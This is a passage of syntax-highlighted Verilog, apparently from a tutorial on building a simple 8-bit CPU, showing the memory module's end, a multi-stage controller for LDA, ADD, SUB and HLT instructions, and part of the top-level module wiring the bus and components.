</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">ram</span>[<span style="color:#d19a66">0</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">15</span>];		<span style="color:#7f848e">// 16 8-bit wide elements
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">always</span> @ (<span style="color:#c678dd">posedge</span> <span style="color:#e06c75">clk</span>, <span style="color:#c678dd">posedge</span> <span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> (<span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">mar</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">4</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">load</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">mar</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#e06c75">bus</span>[<span style="color:#d19a66">3</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>];
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">assign</span> <span style="color:#e06c75">out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ram</span>[<span style="color:#e06c75">mar</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h2 id="the-controller">The controller</h2>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#7f848e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">Control signals:
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">	hlt: halt execution
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">	pc_inc: increment program counter
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">	pc_en: put value of the pc onto the bus
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">	mar_load: load address into memory address register
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">	mem_en: put value from memory into the bus
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">	ir_load: load value from bus into intruction register
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">	ir_en: put value in ir onto the bus
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">	a_load: load value from bus into A register
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">	a_en: put value in A onto the bus
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">	b_load: load value from bus into B register
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">	adder_sub: subtract value in B from A
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">	adder_en: put value in adder onto the bus
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">controller</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">clk</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">rst</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span>[<span style="color:#d19a66">3</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">opcode</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span>[<span style="color:#d19a66">11</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">HLT</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">11</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">PC_INC</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">10</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">PC_EN</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">9</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">MAR_LOAD</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">8</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">MEM_EN</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">7</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">IR_LOAD</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">6</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">IR_EN</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">A_LOAD</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">A_EN</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">3</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">B_LOAD</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">ADDER_SUB</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">ADDER_EN</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">OP_LDA</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span><span style="color:#d19a66">&#39;b0000</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">OP_ADD</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span><span style="color:#d19a66">&#39;b0001</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">OP_SUB</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span><span style="color:#d19a66">&#39;b0010</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">OP_HLT</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span><span style="color:#d19a66">&#39;b1111</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">2</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">stage</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">11</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">ctrl_word</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">always</span> @ (<span style="color:#c678dd">posedge</span> <span style="color:#e06c75">clk</span>, <span style="color:#c678dd">posedge</span> <span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> (<span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">stage</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> 
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">if</span> (<span style="color:#e06c75">stage</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">5</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">stage</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span>
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">stage</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#e06c75">stage</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">always</span> @ (<span style="color:#56b6c2">*</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">ctrl_word</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">12</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">case</span> (<span style="color:#e06c75">stage</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#d19a66">0</span><span style="color:#56b6c2">:</span>
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>					<span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">PC_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>					<span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MAR_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>			<span style="color:#d19a66">1</span><span style="color:#56b6c2">:</span>
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>					<span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">PC_INC</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#d19a66">2</span><span style="color:#56b6c2">:</span> 
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>					<span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MEM_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>					<span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">IR_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#d19a66">3</span><span style="color:#56b6c2">:</span>
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>					<span style="color:#c678dd">case</span> (<span style="color:#e06c75">opcode</span>)
</span></span><span style="display:flex;"><span>						<span style="color:#e06c75">OP_LDA:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">IR_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MAR_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_ADD:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">IR_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MAR_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_SUB:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">IR_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MAR_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_HLT:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">HLT</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">endcase</span>
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>            <span style="color:#d19a66">4</span><span style="color:#56b6c2">:</span> 
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">case</span> (<span style="color:#e06c75">opcode</span>)
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_LDA:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MEM_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">A_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_ADD:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MEM_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">B_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_SUB:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MEM_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">B_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">endcase</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#d19a66">5</span><span style="color:#56b6c2">:</span> 
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">case</span> (<span style="color:#e06c75">opcode</span>)
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_ADD:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">ADDER_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">A_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_SUB:</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">ADDER_SUB</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">ADDER_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">A_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">endcase</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">endcase</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">assign</span> <span style="color:#e06c75">out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ctrl_word</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h2 id="the-top-module">The top module</h2>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">top_design</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">CLK</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">bus</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#7f848e">// multiplex between the output of the different modules
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>	<span style="color:#c678dd">always</span> @ (<span style="color:#56b6c2">*</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> (<span style="color:#e06c75">ir_en</span>) 
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ir_out</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">adder_en</span>) 
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">adder_out</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">a_en</span>) 
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">a_out</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">mem_en</span>) 
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mem_out</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">pc_en</span>) 
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pc_out</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> 
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">8</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// generate clock signal
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">rst</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">hlt</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">clk</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">clock</span> <span style="color:#e06c75">clock</span> (
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">hlt</span>(<span style="color:#e06c75">hlt</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk_in</span>(<span style="color:#e06c75">CLK</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk_out</span>(<span style="color:#e06c75">clk</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// program counter
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">pc_inc</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">pc_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">pc_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pc</span> <span style="color:#e06c75">pc</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">inc</span>(<span style="color:#e06c75">pc_inc</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">pc_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// memory
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">mar_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">mem_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">mem_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">memory</span> <span style="color:#e06c75">mem</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">mar_load</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">mem_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// A register (accumulator)
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">a_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">a_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">a_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">reg_a</span> <span style="color:#e06c75">reg_a</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">a_load</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">a_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// B register
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">b_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">b_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">reg_b</span> <span style="color:#e06c75">reg_b</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">b_load</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">b_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// adder 
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">adder_sub</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">adder_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">adder_out</span>;
